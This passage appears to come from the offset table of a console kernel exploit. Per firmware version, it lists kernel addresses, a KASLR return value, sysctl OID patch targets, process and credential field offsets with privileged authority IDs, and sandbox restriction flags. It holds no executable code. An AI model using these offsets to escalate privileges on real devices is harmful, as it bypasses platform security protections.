        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "12.70" }] = {
        kernelData = 0x00D50000,
        allproc = 0x035D5E00,
        rootvnode = 0x03E27510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00B6EB51, retLow16 = 0xEB51 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = { base = 0x0294B408, kind = 0x0294B41C, kindByte3 = 0x0294B41F,
                arg1 = 0x0294B420, arg1Byte1 = 0x0294B421, arg1Value = 0x0294B3F8,
                deadSink = 0x0294B428 },
            b = { base = 0x0294B2E0, kind = 0x0294B2F4, kindByte3 = 0x0294B2F7,
                arg1 = 0x0294B2F8, arg1Value = 0x0294B210, visible = 0x0294B330 },
            c = { base = 0x02C6E108, kind = 0x02C6E11C, arg1 = 0x02C6E120,
                arg1Value = 0x03DA32BC, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03DA32B8, mib = {9, 7} },
        nodeMutex = 0x01B1AB78,
        rodataProbe = { rva = 0x011C86D5, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "13.00" }] = {
        kernelData = 0x00CB0000,
        allproc = 0x03575E00,
        rootvnode = 0x03DE3510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AD8582, retLow16 = 0x8582 },
    
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x028BEC88, kind = 0x028BEC9C, kindByte3 = 0x028BEC9F,
                arg1 = 0x028BECA0, arg1Byte1 = 0x028BECA1, arg1Value = 0x028BEC78,
                deadSink = 0x028BECA8,
            },
            b = {
                base = 0x028BEB60, kind = 0x028BEB74, kindByte3 = 0x028BEB77,
                arg1 = 0x028BEB78, arg1Value = 0x028BEA90, visible = 0x028BEBB0,
            },
            c = {
                base = 0x02BE1958, kind = 0x02BE196C, arg1 = 0x02BE1970,
                arg1Value = 0x03D5E73C, mib = {9, 8},
            },
        },
    
        walkCounter = { addr = 0x03D5E738, mib = {9, 7} },
        nodeMutex = 0x01A8BA78,
        rodataProbe = { rva = 0x013678A5, text = "_aio_submit_cmd\0_aio_multi_wait" },
    
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
    
        proc = { pid = 0x0BC, ucred = 0x040, fd = 0x048, aioInfo = 0x0C48, dynlib = 0x3E8 },
        kernelPid = 0,
    
        ucred = {
            uid = 0x04, ruid = 0x08, svuid = 0x0C, ngroups = 0x10,
            rgid = 0x14, svgid = 0x18, sceAuthId = 0x58, sceCaps = 0x60,
            sceCaps1 = 0x68, sceAttrs = 0x80,
        },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
    
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = {
            count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0C, buffer = 0x10,
            pair = 0xE8, defaultSize = 0x4000,
        },
        dynlib = { syscallStart = 0xF0, syscallEnd = 0xF8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "13.20" }] = {
        kernelData = 0x00CB0000,
        allproc = 0x03575E00,
        rootvnode = 0x03DE3510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AD8790, retLow16 = 0x8790 },
        oid = {
            originalKind = 0x80048002, writableKind = 0x70048002,
            a = { base = 0x028BEC88, kind = 0x028BEC9C, kindByte3 = 0x028BEC9F, arg1 = 0x028BECA0, arg1Byte1 = 0x028BECA1, arg1Value = 0x028BEC78, deadSink = 0x028BECA8 },
            b = { base = 0x028BEB60, kind = 0x028BEB74, kindByte3 = 0x028BEB77, arg1 = 0x028BEB78, arg1Value = 0x028BEA90, visible = 0x028BEBB0 },
            c = { base = 0x02BE1958, kind = 0x02BE196C, arg1 = 0x02BE1970, arg1Value = 0x03D5E73C, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03D5E738, mib = {9, 7} },
        nodeMutex = 0x01A8BA78,
        rodataProbe = { rva = 0x01367C97, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28, group = { num = 0x00, state = 0x08, waiters = 0x50 }, idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18, sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "13.40" }] = {
        kernelData = 0x00CB0000,
        allproc = 0x03579E80,
        rootvnode = 0x03DE7510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AD8AA0, retLow16 = 0x8AA0 },
        oid = {
            originalKind = 0x80048002, writableKind = 0x70048002,
            a = { base = 0x028BEE88, kind = 0x028BEE9C, kindByte3 = 0x028BEE9F, arg1 = 0x028BEEA0, arg1Byte1 = 0x028BEEA1, arg1Value = 0x028BEE78, deadSink = 0x028BEEA8 },
            b = { base = 0x028BED60, kind = 0x028BED74, kindByte3 = 0x028BED77, arg1 = 0x028BED78, arg1Value = 0x028BEC90, visible = 0x028BEDB0 },
            c = { base = 0x02BE1B58, kind = 0x02BE1B6C, arg1 = 0x02BE1B70, arg1Value = 0x03D6273C, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03D62738, mib = {9, 7} },
        nodeMutex = 0x01A8BAB8,
        rodataProbe = { rva = 0x01367A24, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28, group = { num = 0x00, state = 0x08, waiters = 0x50 }, idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18, sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "13.42" }] = {
        kernelData = 0x00CB0000,
        allproc = 0x03579E80,
        rootvnode = 0x03DE7510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AD8AA0, retLow16 = 0x8AA0 },
        oid = {
            originalKind = 0x80048002, writableKind = 0x70048002,
            a = { base = 0x028BEE88, kind = 0x028BEE9C, kindByte3 = 0x028BEE9F, arg1 = 0x028BEEA0, arg1Byte1 = 0x028BEEA1, arg1Value = 0x028BEE78, deadSink = 0x028BEEA8 },
            b = { base = 0x028BED60, kind = 0x028BED74, kindByte3 = 0x028BED77, arg1 = 0x028BED78, arg1Value = 0x028BEC90, visible = 0x028BEDB0 },
            c = { base = 0x02BE1B58, kind = 0x02BE1B6C, arg1 = 0x02BE1B70, arg1Value = 0x03D6273C, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03D62738, mib = {9, 7} },
        nodeMutex = 0x01A8BAB8,
        rodataProbe = { rva = 0x01367E06, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28, group = { num = 0x00, state = 0x08, waiters = 0x50 }, idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18, sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "13.60" }] = {
        kernelData = 0x00CC0000,
        allproc = 0x03589E80,
        rootvnode = 0x03E0B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AE2DA0, retLow16 = 0x2DA0 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x028cef68, kind = 0x028cef7c, kindByte3 = 0x028cef7f,
                arg1 = 0x028cef80, arg1Byte1 = 0x028cef81, arg1Value = 0x028cef58,
                deadSink = 0x028cef88,
            },
            b = {
                base = 0x028cee40, kind = 0x028cee54, kindByte3 = 0x028cee57,
                arg1 = 0x028cee58, arg1Value = 0x028ced70, visible = 0x028cee90,
            },
            c = {
                base = 0x02bf1c38, kind = 0x02bf1c4c, arg1 = 0x02bf1c50,
                arg1Value = 0x03d831bc, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03d831b8, mib = {9, 7} },
        nodeMutex = 0x01a9bab8,
        rodataProbe = { rva = 0x01379d6c, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "7.00" }] = {
        kernelData = 0x00C50000,
        allproc = 0x034A9D50,
        rootvnode = 0x03D17510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A83731, retLow16 = 0x3731 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027706C8, kind = 0x027706DC, kindByte3 = 0x027706DF,
                arg1 = 0x027706E0, arg1Byte1 = 0x027706E1, arg1Value = 0x027706B8,
                deadSink = 0x027706E8,
            },
            b = {
                base = 0x027705A0, kind = 0x027705B4, kindByte3 = 0x027705B7,
                arg1 = 0x027705B8, arg1Value = 0x027704D0, visible = 0x027705F0,
            },
            c = {
                base = 0x02A92FA8, kind = 0x02A92FBC, arg1 = 0x02A92FC0,
                arg1Value = 0x03C93F3C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03C93F38, mib = {9, 7} },
        nodeMutex = 0x01A6FE18,
        rodataProbe = { rva = 0x01010A7A, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "7.01" }] = {
        kernelData = 0x00C50000,
        allproc = 0x034A9D50,
        rootvnode = 0x03D17510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A83731, retLow16 = 0x3731 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027706C8, kind = 0x027706DC, kindByte3 = 0x027706DF,
                arg1 = 0x027706E0, arg1Byte1 = 0x027706E1, arg1Value = 0x027706B8,
                deadSink = 0x027706E8,
            },
            b = {
                base = 0x027705A0, kind = 0x027705B4, kindByte3 = 0x027705B7,
                arg1 = 0x027705B8, arg1Value = 0x027704D0, visible = 0x027705F0,
            },
            c = {
                base = 0x02A92FA8, kind = 0x02A92FBC, arg1 = 0x02A92FC0,
                arg1Value = 0x03C93F3C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03C93F38, mib = {9, 7} },
        nodeMutex = 0x01A6FE18,
        rodataProbe = { rva = 0x01010FA2, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "7.20" }] = {
        kernelData = 0x00C50000,
        allproc = 0x034A9D50,
        rootvnode = 0x03D17510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A83B81, retLow16 = 0x3B81 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02770788, kind = 0x0277079C, kindByte3 = 0x0277079F,
                arg1 = 0x027707A0, arg1Byte1 = 0x027707A1, arg1Value = 0x02770778,
                deadSink = 0x027707A8,
            },
            b = {
                base = 0x02770660, kind = 0x02770674, kindByte3 = 0x02770677,
                arg1 = 0x02770678, arg1Value = 0x02770590, visible = 0x027706B0,
            },
            c = {
                base = 0x02A93068, kind = 0x02A9307C, arg1 = 0x02A93080,
                arg1Value = 0x03C93F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03C93F78, mib = {9, 7} },
        nodeMutex = 0x01A6FED8,
        rodataProbe = { rva = 0x01010B71, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "7.40" }] = {
        kernelData = 0x00C50000,
        allproc = 0x034A9D50,
        rootvnode = 0x03D17510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A83B81, retLow16 = 0x3B81 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02770788, kind = 0x0277079C, kindByte3 = 0x0277079F,
                arg1 = 0x027707A0, arg1Byte1 = 0x027707A1, arg1Value = 0x02770778,
                deadSink = 0x027707A8,
            },
            b = {
                base = 0x02770660, kind = 0x02770674, kindByte3 = 0x02770677,
                arg1 = 0x02770678, arg1Value = 0x02770590, visible = 0x027706B0,
            },
            c = {
                base = 0x02A93068, kind = 0x02A9307C, arg1 = 0x02A93080,
                arg1Value = 0x03C93F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03C93F78, mib = {9, 7} },
        nodeMutex = 0x01A6FED8,
        rodataProbe = { rva = 0x010110B6, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "7.60" }] = {
        kernelData = 0x00C50000,
        allproc = 0x034A9D50,
        rootvnode = 0x03D17510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A84191, retLow16 = 0x4191 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02770808, kind = 0x0277081C, kindByte3 = 0x0277081F,
                arg1 = 0x02770820, arg1Byte1 = 0x02770821, arg1Value = 0x027707F8,
                deadSink = 0x02770828,
            },
            b = {
                base = 0x027706E0, kind = 0x027706F4, kindByte3 = 0x027706F7,
                arg1 = 0x027706F8, arg1Value = 0x02770610, visible = 0x02770730,
            },
            c = {
                base = 0x02A930E8, kind = 0x02A930FC, arg1 = 0x02A93100,
                arg1Value = 0x03C93F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03C93F78, mib = {9, 7} },
        nodeMutex = 0x01A6FED8,
        rodataProbe = { rva = 0x01010BCA, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "7.61" }] = {
        kernelData = 0x00C50000,
        allproc = 0x034A9D50,
        rootvnode = 0x03D17510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A84191, retLow16 = 0x4191 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02770808, kind = 0x0277081C, kindByte3 = 0x0277081F,
                arg1 = 0x02770820, arg1Byte1 = 0x02770821, arg1Value = 0x027707F8,
                deadSink = 0x02770828,
            },
            b = {
                base = 0x027706E0, kind = 0x027706F4, kindByte3 = 0x027706F7,
                arg1 = 0x027706F8, arg1Value = 0x02770610, visible = 0x02770730,
            },
            c = {
                base = 0x02A930E8, kind = 0x02A930FC, arg1 = 0x02A93100,
                arg1Value = 0x03C93F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03C93F78, mib = {9, 7} },
        nodeMutex = 0x01A6FED8,
        rodataProbe = { rva = 0x0101114F, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "8.00" }] = {
        kernelData = 0x00C70000,
        allproc = 0x034E5D50,
        rootvnode = 0x03D6B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A9CAC5, retLow16 = 0xCAC5 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027914E8, kind = 0x027914FC, kindByte3 = 0x027914FF,
                arg1 = 0x02791500, arg1Byte1 = 0x02791501, arg1Value = 0x027914D8,
                deadSink = 0x02791508,
            },
            b = {
                base = 0x027913C0, kind = 0x027913D4, kindByte3 = 0x027913D7,
                arg1 = 0x027913D8, arg1Value = 0x027912F0, visible = 0x02791410,
            },
            c = {
                base = 0x02AB3DC8, kind = 0x02AB3DDC, arg1 = 0x02AB3DE0,
                arg1Value = 0x03CE7F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03CE7F78, mib = {9, 7} },
        nodeMutex = 0x01A8FF48,
        rodataProbe = { rva = 0x010254E9, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "8.20" }] = {
        kernelData = 0x00C70000,
        allproc = 0x034E5D50,
        rootvnode = 0x03D6B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A9DEC5, retLow16 = 0xDEC5 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027913A8, kind = 0x027913BC, kindByte3 = 0x027913BF,
                arg1 = 0x027913C0, arg1Byte1 = 0x027913C1, arg1Value = 0x02791398,
                deadSink = 0x027913C8,
            },
            b = {
                base = 0x02791280, kind = 0x02791294, kindByte3 = 0x02791297,
                arg1 = 0x02791298, arg1Value = 0x027911B0, visible = 0x027912D0,
            },
            c = {
                base = 0x02AB3C88, kind = 0x02AB3C9C, arg1 = 0x02AB3CA0,
                arg1Value = 0x03CE7F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03CE7F78, mib = {9, 7} },
        nodeMutex = 0x01A8FF48,
        rodataProbe = { rva = 0x0102527F, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "8.40" }] = {
        kernelData = 0x00C70000,
        allproc = 0x034E5D50,
        rootvnode = 0x03D6B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A9E155, retLow16 = 0xE155 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027913A8, kind = 0x027913BC, kindByte3 = 0x027913BF,
                arg1 = 0x027913C0, arg1Byte1 = 0x027913C1, arg1Value = 0x02791398,
                deadSink = 0x027913C8,
            },
            b = {
                base = 0x02791280, kind = 0x02791294, kindByte3 = 0x02791297,
                arg1 = 0x02791298, arg1Value = 0x027911B0, visible = 0x027912D0,
            },
            c = {
                base = 0x02AB3C88, kind = 0x02AB3C9C, arg1 = 0x02AB3CA0,
